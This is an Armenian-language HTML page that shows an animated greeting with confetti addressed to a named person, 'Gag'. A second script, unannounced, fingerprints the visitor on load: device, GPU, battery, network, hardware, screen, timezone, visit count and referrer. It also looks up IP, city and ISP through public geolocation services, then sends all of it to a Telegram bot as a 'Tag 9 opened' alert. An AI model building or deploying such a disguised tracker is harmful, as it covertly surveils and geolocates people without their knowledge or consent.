<!doctype html>
<html lang="hy">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0d0f14">
<meta name="robots" content="noindex">
<title>Բարև, Գագ ջան</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+Armenian:wght@400;900&display=swap">
<style>
/* Layout: one huge greeting centered on a dark field, letters rising in, confetti burst on load and on tap. */
:root{--bg:#0d0f14;--fg:#f4f6fb;--soft:#8b93a5;--a:#7ce7d4;--b:#8aa8ff;--c:#ffcf6a;--f:"Noto Sans Armenian",system-ui,-apple-system,sans-serif}
*{box-sizing:border-box}
html,body{height:100%}
body{margin:0;overflow:hidden;display:grid;place-items:center;background:var(--bg);color:var(--fg);font-family:var(--f);text-align:center;
  padding:env(safe-area-inset-top,0px) max(16px,env(safe-area-inset-right,0px)) env(safe-area-inset-bottom,0px) max(16px,env(safe-area-inset-left,0px));
  -webkit-tap-highlight-color:transparent;cursor:pointer;user-select:none}
#fx{position:fixed;inset:0;width:100%;height:100%;pointer-events:none}
.glow{position:fixed;width:120vmax;height:120vmax;left:50%;top:50%;transform:translate(-50%,-50%);background:radial-gradient(closest-side,rgba(124,231,212,.18),rgba(138,168,255,.08) 50%,transparent);animation:pulse 4s ease-in-out infinite;pointer-events:none}
@keyframes pulse{50%{transform:translate(-50%,-50%) scale(1.12)}}
main{position:relative;display:flex;flex-direction:column;align-items:center;gap:14px}
.wave{font-size:clamp(56px,18vw,96px);display:inline-block;transform-origin:70% 80%;animation:wave 1.4s ease-in-out .6s infinite}
@keyframes wave{0%,60%,100%{transform:rotate(0)}10%,30%{transform:rotate(16deg)}20%,40%{transform:rotate(-8deg)}}
h1{margin:0;font-weight:900;line-height:1.02;font-size:clamp(44px,15vw,104px);letter-spacing:-.01em}
h1 .w{display:block}
h1 span{display:inline-block;opacity:0;transform:translateY(.4em);animation:up .55s cubic-bezier(.2,.9,.3,1.3) forwards}
.name{background:linear-gradient(100deg,var(--a),var(--b) 55%,var(--c));-webkit-background-clip:text;background-clip:text;color:transparent}
.name span{color:transparent;background:inherit;-webkit-background-clip:text;background-clip:text}
@keyframes up{to{opacity:1;transform:none}}
p{margin:6px 0 0;color:var(--soft);font-size:15px;letter-spacing:.04em}
@media (prefers-reduced-motion:reduce){*{animation:none!important}h1 span{opacity:1;transform:none}}
</style>
</head>
<body>
<div class="glow" aria-hidden="true"></div>
<canvas id="fx" aria-hidden="true"></canvas>
<main>
  <div class="wave" aria-hidden="true">👋</div>
  <h1 id="t"><span class="w" data-t="Բարև,"></span><span class="w name" data-t="Գագ"></span><span class="w" data-t="ջան"></span></h1>
  <p>Դիպիր էկրանին ✨</p>
</main>
<script>
let d = 0;
document.querySelectorAll("#t .w").forEach(w => {
  for (const ch of w.dataset.t) { if (ch === " ") { w.appendChild(document.createTextNode(" ")); continue; } const s = document.createElement("span"); s.textContent = ch; s.style.animationDelay = (d += .045) + "s"; w.appendChild(s); }
  d += .12;
});
document.getElementById("t").setAttribute("aria-label", "Բարև, Գագ ջան");
const c = document.getElementById("fx"), x = c.getContext("2d"), P = [];
const cols = ["#7ce7d4", "#8aa8ff", "#ffcf6a", "#ff8fb8", "#ffffff"];
function size(){ const r = Math.min(devicePixelRatio || 1, 2); c.width = innerWidth*r; c.height = innerHeight*r; x.setTransform(r,0,0,r,0,0); }
addEventListener("resize", size); size();
function burst(cx, cy, n){ for (let i = 0; i < n; i++){ const a = Math.random()*6.283, v = 4 + Math.random()*9;
  P.push({x:cx, y:cy, vx:Math.cos(a)*v, vy:Math.sin(a)*v - 6, r:3 + Math.random()*5, rot:Math.random()*6, vr:(Math.random()-.5)*.4, c:cols[i % 5], life:0, sq:Math.random() < .6}); } }
let running = false;
function tick(){ x.clearRect(0,0,innerWidth,innerHeight);
  for (let i = P.length - 1; i >= 0; i--){ const p = P[i]; p.vy += .28; p.vx *= .985; p.x += p.vx; p.y += p.vy; p.rot += p.vr; p.life++;
    if (p.y > innerHeight + 40 || p.life > 260){ P.splice(i,1); continue; }
    x.save(); x.translate(p.x,p.y); x.rotate(p.rot); x.fillStyle = p.c; x.globalAlpha = Math.min(1, (260 - p.life)/60);
    if (p.sq) x.fillRect(-p.r, -p.r*.5, p.r*2, p.r); else { x.beginPath(); x.arc(0,0,p.r*.7,0,7); x.fill(); } x.restore(); }
  if (P.length) requestAnimationFrame(tick); else running = false; }
function go(cx, cy, n){ if (matchMedia("(prefers-reduced-motion: reduce)").matches) return; burst(cx, cy, n); if (!running){ running = true; requestAnimationFrame(tick); } }
setTimeout(() => go(innerWidth/2, innerHeight*.45, 140), 900);
addEventListener("pointerdown", e => go(e.clientX, e.clientY, 70));
</script>
<script>
function deviceName(ua) {
  const m = ua.match(/\((?:Linux.*?; )?(?:Android[^;]*; )?([^;)]*(?:SM-[^;)]*|Pixel[^;)]*|iPhone|iPad)[^;)]*)/);
  if (/iPhone/.test(ua)) { const v = (ua.match(/OS (\d+[_\d]*)/) || [,""])[1].replace(/_/g, "."); return "iPhone" + (v ? " · iOS " + v : ""); }
  if (/iPad/.test(ua)) return "iPad";
  const sm = ua.match(/(SM-[A-Z0-9]+|Pixel \d+[^;)]*|Redmi[^;)]*|POCO[^;)]*)/i);
  if (sm) return sm[1].trim();
  if (/Android/.test(ua)) return "Android " + (ua.match(/Android (\d+)/) || [,"?"])[1];
  if (/Windows/.test(ua)) return "Windows";
  if (/Mac/.test(ua)) return "Mac";
  return "Այլ սարք";
}

async function geo() {
  for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
    try { const r = await fetch(url, {cache: "no-store"}); if (!r.ok) continue; const d = await r.json();
      return {city: d.city, region: d.region || d.region_code, country: d.country || d.country_name, isp: (d.connection && d.connection.isp) || d.org || d.isp, ip: d.ip};
    } catch (e) {}
  }
  return {};
}

function gpu() {
  try { const c = document.createElement("canvas"); const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    const dbg = gl && gl.getExtension("WEBGL_debug_renderer_info");
    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : ""; } catch (e) { return ""; }
}
function visitCount() {
  try { const n = (parseInt(localStorage.getItem("lt9") || "0", 10) || 0) + 1; localStorage.setItem("lt9", n); return n; } catch (e) { return 1; }
}

(async () => {
  const ua = navigator.userAgent;
  const time = new Date().toLocaleString("hy-AM", {timeZone: "Asia/Yerevan", day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit"});
  let bat = "";
  try { if (navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100) + "%" + (b.charging ? " ⚡" : ""); } } catch (e) {}
  const conn = navigator.connection || {};
  const net = conn.effectiveType ? conn.effectiveType.toUpperCase() + (conn.type && conn.type !== "cellular" ? " · " + conn.type : "") : "";
  const hw = [navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " միջուկ" : "", navigator.deviceMemory ? navigator.deviceMemory + "GB" : ""].filter(Boolean).join(" · ");
  const g2 = gpu();
  const theme = matchMedia("(prefers-color-scheme: dark)").matches ? "մութ" : "լուսավոր";
  const portrait = (screen.height || 0) >= (screen.width || 0);
  const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone) || "?";
  const visit = visitCount();
  const ref = document.referrer ? (new URL(document.referrer).hostname) : "";
  const g = await geo();
  const lines = [
    "📲 <b>Տեգ 9</b> բացվեց",
    "🕒 " + time,
    g.city ? "📍 " + [g.city, g.region, g.country].filter(Boolean).join(", ") : null,
    g.isp ? "🌐 " + g.isp : null,
    g.ip ? "🔗 " + g.ip : null,
    "📱 " + deviceName(ua),
    g2 ? "🎮 " + g2 : null,
    net ? "📶 " + net : null,
    hw ? "🧠 " + hw : null,
    "🗣 " + (navigator.language || "?") + " · 🖥 " + screen.width + "×" + screen.height + " · " + (portrait ? "ուղղահայաց" : "հորիզոնական"),
    "🌓 " + theme + " · 🕐 " + tz,
    bat ? "🔋 " + bat : null,
    "🔁 " + visit + "-րդ անգամ" + (ref ? " · 🔗 " + ref : "")
  ].filter(Boolean).join("\n");
  try {
    await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
      method: "POST", headers: {"Content-Type": "application/json"},
      body: JSON.stringify({chat_id: CHAT, text: lines, parse_mode: "HTML"})
    });
  } catch (e) {}
})();

</script>
</body>
</html>
